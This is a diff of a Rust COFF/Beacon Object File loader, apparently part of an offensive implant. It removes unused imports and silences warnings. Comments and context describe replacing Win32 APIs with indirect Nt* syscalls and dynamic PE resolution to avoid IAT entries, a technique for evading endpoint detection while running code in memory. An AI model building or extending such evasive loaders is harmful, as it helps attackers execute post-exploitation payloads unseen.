@@ -39,18 +39,14 @@
 use std::ffi::c_void;
 use std::sync::atomic::{AtomicPtr, AtomicUsize, Ordering};
 
-use winapi::shared::minwindef::{DWORD, LPVOID, UINT};
-use winapi::shared::ntdef::HRESULT;
-use winapi::shared::winerror::S_OK;
 // CloseHandle removed — using NtClose indirect syscall
 // LoadLibraryA/GetProcAddress removed — using pe_resolve dynamic resolution
 // VirtualAlloc/VirtualFree/VirtualProtect removed — using Nt* indirect syscalls
 // CreateThread/WaitForSingleObject removed — using NtCreateThreadEx/NtWaitForSingleObject indirect syscalls
 // CreateEventW removed — was unused
-use winapi::um::winbase::WAIT_OBJECT_0;
 use winapi::um::winnt::{
     MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READONLY,
-    PAGE_READWRITE, PVOID,
+    PAGE_READWRITE,
 };
 
 // ── Constants ────────────────────────────────────────────────────────────────
@@ -1245,7 +1241,7 @@ pub unsafe fn execute_bof(
             ));
         }
     }
-    let is_amd64 = header.machine == IMAGE_FILE_MACHINE_AMD64;
+    let _is_amd64 = header.machine == IMAGE_FILE_MACHINE_AMD64;
 
     log::info!(
         "[coff_loader] COFF: machine={:#06X} sections={} symbols={}",
@@ -1503,7 +1499,7 @@ pub unsafe fn execute_bof(
                 }
                 IMAGE_REL_I386_REL32 => {
                     let target_va = section_base + reloc.virtual_address as usize;
-                    let rel = (sym_addr as i32 - target_va as i32 - 4);
+                    let rel = sym_addr as i32 - target_va as i32 - 4;
                     *(target_ptr as *mut i32) = rel;
                 }
                 _ => unreachable!(),
@@ -1582,7 +1578,7 @@ pub unsafe fn execute_bof(
 
     // ── Find "go" entry point ───────────────────────────────────────────
     let mut go_addr: Option<usize> = None;
-    for (idx, symbol) in symbols.iter().enumerate() {
+    for (_idx, symbol) in symbols.iter().enumerate() {
         // Skip auxiliary symbols.
         if symbol.storage_class == 0 {
             continue;
@@ -1664,7 +1660,7 @@ pub unsafe fn execute_bof(
 
     // ── Execute BOF on a thread ─────────────────────────────────────────
     let timeout = timeout_secs.unwrap_or(DEFAULT_TIMEOUT_SECS);
-    let go_fn: extern "C" fn(*mut u8, i32) = std::mem::transmute(go_addr);
+    let _go_fn: extern "C" fn(*mut u8, i32) = std::mem::transmute(go_addr);
 
     // CreateThread → NtCreateThreadEx (indirect syscall, no IAT entry)
     let mut thread_handle_raw: usize = 0;
